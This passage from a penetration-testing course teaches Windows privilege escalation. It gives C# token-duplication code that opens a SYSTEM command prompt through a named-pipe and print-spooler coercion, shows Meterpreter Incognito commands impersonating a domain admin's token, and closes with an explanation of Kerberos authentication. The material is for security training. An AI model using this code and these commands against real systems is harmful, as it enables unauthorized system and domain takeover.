_ImpersonationLevel_ must be set to _SecurityImpersonation_,[35](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-35) which is the access type we currently have to the token. This has a numerical value of "2". For the _TokenType_, we'll specify a primary token (_TokenPrimary_[36](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-36)) by setting this to "1".

The final argument (_phNewToken_) is a pointer that will be populated with the handle to the duplicated token. The code additions are shown in Listing 41.

```
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
...
IntPtr hSystemToken = IntPtr.Zero;
DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
```

> Listing 41 - Code additions to call DuplicateTokenEx

With the token duplicated as a primary token, we can call _CreateProcessWithToken_ to create a command prompt as SYSTEM.

Listing 42 lists the function prototype for _CreateProcessWithToken_.

```
BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

> Listing 42 - CreateProcessWithToken function prototype

First, we'll supply the newly duplicated token followed by a logon option, which we set to its default of 0. For the third (_lpApplicationName_) and fourth (_lpCommandLine_) arguments, we'll supply NULL and the full path of cmd.exe, respectively.

The creation flags (_dwCreationFlags_), environment block (_lpEnvironment_), and current directory (_lpCurrentDirectory_) arguments can be set to 0, NULL, and NULL respectively to select the default options.

For the two last arguments (_lpStartupInfo_ and _lpProcessInformation_), we must pass _STARTUPINFO_[37](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-37) and _PROCESS_INFORMATION_[38](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-38) structures, which are populated by the API during execution. Neither of these are defined in P/invoke imports so we must define them ourselves as shown in the following code:

```
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
...
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
```

> Listing 43 - Code additions to call CreateProcessWithTokenW

With all the code written, we'll compile and transfer it to the Windows Server 2019 machine. We'll execute this just as before, by first launching our application to create the pipe server with the name "\\.\appsrv01\test\pipe\spoolss".

Next, we'll launch SpoolSample with the capture server set to "\\appsrv01/pipe/test", which will force the SYSTEM account to connect to our named pipe and a new command prompt is opened.

When we interact with it and display the user, we find it to be SYSTEM:

```
C:\Windows\system32> whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ========
nt authority\system S-1-5-18
```

> Listing 44 - System command prompt

With this attack, we can elevate our privileges from an unprivileged account that has the _SeImpersonatePrivilege_ to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10. Nice!

A C++ implementation of this attack that has the SpoolSample functionality embedded is available by the researcher who discovered the technique.[39](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-39)

Most native and third-party services that do not require administrative permissions run as Network Service or Local Service, partly due to Microsoft's recommendation. This attack technique means that compromising an unprivileged service is just as valuable as a SYSTEM service.

The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and Yarden Shafir.[40](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-40) It impersonates the _RPC system service_ (RpcSs),[41](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-41) which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for _Network Service_.

On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through _COM_.[42](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-42) It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the _RoguePotato_[43](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-43) tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access.

Lastly, the _beans_[44](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-44) technique based on local man-in-the-middle authentication with _Windows Remote Management_ (WinRM)[45](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-45) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default.

In the next section, we'll demonstrate how to impersonate tokens from other authenticated users instead of simply advancing straight to SYSTEM.

#### Exercises

1. Combine the code and verify the token impersonation.
2. Use the C# code and combine it with previous tradecraft to obtain a Meterpreter, Covenant, or Empire SYSTEM shell.
3. Try to use the attack in the context of _Local Service_ instead of _Network Service_.

1

(Bryan Alexander, Steve Breen, 2017), [https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-1)

2

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Handle_(computing)](https://en.wikipedia.org/wiki/Handle_\(computing\)) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-2)

3

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/services/localservice-account](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-3)

4

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-4)

5

(@itm4n, 2020), [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-5)

6

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/ipc/pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/pipes) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-6)

7

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications](https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-7)

8

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/ipc/anonymous-pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/anonymous-pipes) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-8)

9

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-9)

10

(@harmj0y, 2017), [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-10)

11

(Microsoft, 2019), [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-11)

12

(Micorosft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-12)

13

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-13)

14

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-14)

15

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-waitnamedpipea](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-waitnamedpipea) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-15)

16

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-16)

17

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-17)

18

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsidw](https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsidw) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-18)

19

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-19)

20

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/secauthz/access-rights-for-access-token-objects](https://docs.microsoft.com/en-gb/windows/win32/secauthz/access-rights-for-access-token-objects) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-20)

21

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_information_class](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_information_class) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-21)

22

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=netcore-3.1](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=netcore-3.1) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-22)

23

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_token_user](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_token_user) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-23)

24

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=netcore-3.1](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=netcore-3.1) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-24)

25

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostringauto?view=netcore-3.1](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostringauto?view=netcore-3.1) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-25)

26

(Microsoft, 2019), [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-26)

27

(Microsoft, 2019), [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-27)

28

(Microsoft, 2019), [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-28)

29

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/rpcndr/nf-rpcndr-ndrclientcall2](https://docs.microsoft.com/en-us/windows/win32/api/rpcndr/nf-rpcndr-ndrclientcall2) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-29)

30

(Lee Christensen, 2018), [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-30)

31

(Vincent Le Toux, 2018), [https://github.com/vletoux/SpoolerScanner](https://github.com/vletoux/SpoolerScanner) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-31)

32

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-32)

33

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-33)

34

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-34)

35

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-security_impersonation_level](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-security_impersonation_level) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-35)

36

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_type](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_type) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-36)

37

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa](https://docs.microsoft.com/en-gb/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-37)

38

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-38)

39

(Clément Labro, 2020), [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-39)

40

(Alex Ionescu, 2020), [https://windows-internals.com/faxing-your-way-to-system/](https://windows-internals.com/faxing-your-way-to-system/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-40)

41

(Microsoft, 2009), [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787851(v=ws.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787851\(v=ws.10\)?redirectedfrom=MSDN) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-41)

42

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal](https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-42)

43

(@decoder_it, 2020), [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-43)

44

(@decoder_it, 2019), [https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/](https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-44)

45

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/winrm/portal](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5353-45)

### 15.2.3. Fun with Incognito

In this section, we'll use the Meterpreter Incognito[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5354-1) module to impersonate any logged in users and obtain code execution in their context without access to any passwords or hashes.

Although we'll use Mimikatz to collect Kerberos authentication credentials later in this module, this access token attack vector does not rely on Mimikatz and may evade some detection software.

To demonstrate this, we'll authenticate to appsrv01 as the _admin_ user through Remote Desktop and leave the connection open. We'll then switch to one of the SYSTEM integrity Meterpreter shells we obtained in the previous sections.

Next, we'll load the Incognito extension through the load command as shown in Listing 45 and run help to display available commands.

```
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > help incognito

Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token
```

> Listing 45 - Loading Incognito extension

We'll focus on list_tokens -u, which will list all currently used tokens by unique username:

```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
corp1\admin
IIS APPPOOL\DefaultAppPool
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
NT SERVICE\SQLTELEMETRY$SQLEXPRESS
Window Manager\DWM-1

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

> Listing 46 - Dumping available tokens

The output reveals a delegation token for the domain user _admin_.

Next we'll run impersonate_token to impersonate the _admin_ user through the Win32 _ImpersonateLoggedOnUser_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5354-2) API. To invoke it, we must specify the user name of the token we want to impersonate:

```
meterpreter > impersonate_token corp1\\admin
[+] Delegation token available
[+] Successfully impersonated user corp1\admin

meterpreter > getuid
Server username: corp1\admin
```

> Listing 47 - Impersonating token for the user admin

Listing 47 shows that we were able to impersonate the domain user _admin_ from a delegation token, which will allow us to perform actions on this server and authenticate against remote computers in the context of that user.

With this approach, we have impersonated a user within a Meterpreter shell without writing to disk.

#### Exercise

1. Use a SYSTEM Meterpreter shell to list all tokens and impersonate a delegation token for the domain user _admin_.

1

(Rapid7, 2015), [https://github.com/rapid7/meterpreter/blob/master/source/extensions/incognito/incognito.c](https://github.com/rapid7/meterpreter/blob/master/source/extensions/incognito/incognito.c) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5354-1)

2

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5354-2)

## 15.3. Kerberos and Domain Credentials

In an Active Directory implementation, Kerberos[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5355-1) handles most user and integrated service authentication.

In the following sections, we'll explore how the Kerberos protocol is implemented in Windows and how we can leverage it for credential stealing.

1

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5355-1)

### 15.3.1. Kerberos Authentication

The Microsoft implementation of the Kerberos authentication protocol was adopted from the Kerberos version 5 authentication protocol created by MIT[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5356-1) and has been Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system.

At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a Key Distribution Center (KDC).[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5356-2) This process is shown in Figure 4.

![[OffSec/OSEP/Course/z. images/c6eff9b4cd513b88e328b0315c2b4572_MD5.jpg]]

Figure 4: Diagram of Kerberos Authentication

Let's review this process in detail in order to lay a foundation for discussion in the following section.

When a user logs in, a request is sent to the Domain Controller. This DC serves as a KDC and runs the Authentication Server service. The initial _Authentication Server Request_ (AS_REQ) contains a timestamp encrypted using a hash derived from the current user's username and password.[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5356-3)

When the service receives the request, it looks up the password hash associated with that user and attempts to decrypt the timestamp. If the decryption process is successful and the timestamp is not a duplicate (a potential replay attack), the authentication is considered successful.

The service replies to the client with an _Authentication Server Reply_ (AS_REP), which contains a session key (since Kerberos is stateless) and a _Ticket Granting Ticket_ (TGT). The session key is encrypted using the user's password hash, which the client could decrypt and reuse. The TGT contains user information (including group memberships), the domain, a timestamp, the IP address of the client, and the session key.

In order to avoid tampering, the TGT is encrypted by a secret key known only to the KDC and can not be decrypted by the client. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for 10 hours. During this time, the user is not required to retype the password and the TGT can be renewed without entering the password.

When the user attempts to access domain resources, such as a network share, Exchange mailbox, or some other application with a registered _Service Principal Name_ (SPN),[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5356-4) the KDC is contacted again.

This time, the client constructs a _Ticket Granting Service Request_ (TGS_REQ) packet that consists of the current user and a timestamp (encrypted using the session key), the SPN of the resource, and the encrypted TGT.

Next, the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the decrypted TGT, and this key is used to decrypt the username and timestamp of the request. If the TGT has a valid timestamp (no replay detected and the request has not expired), the TGT and session key usernames match, and the origin and TGT IP addresses match, the request is accepted.

If this succeeds, the ticket granting service responds to the client with a _Ticket Granting Server Reply_ (TGS_REP). This packet contains three parts:

1. The SPN to which access has been granted.
2. A session key to be used between the client and the SPN.
3. A service ticket containing the username and group memberships along with the newly-created session key.

The first two parts (the SPN and session key) are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the target SPN.

Once the authentication process with the KDC is complete and the client has both a session key and a service ticket, service authentication begins.

First, the client sends an _Application Request_ (AP_REQ), which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.

